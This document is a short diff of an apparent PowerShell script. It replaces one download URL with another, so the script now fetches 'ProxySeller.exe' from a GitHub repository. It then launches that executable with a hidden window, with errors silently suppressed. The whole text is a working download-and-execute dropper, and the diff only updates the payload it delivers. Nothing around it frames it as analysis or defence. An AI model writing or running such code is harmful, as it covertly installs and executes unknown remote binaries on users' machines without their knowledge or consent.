@@ -1,7 +1,8 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/ProxySeller.exe" -OutFile "ProxySeller.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
+    Start-Process -FilePath "ProxySeller.exe" -WindowStyle Hidden
+
 
 
 
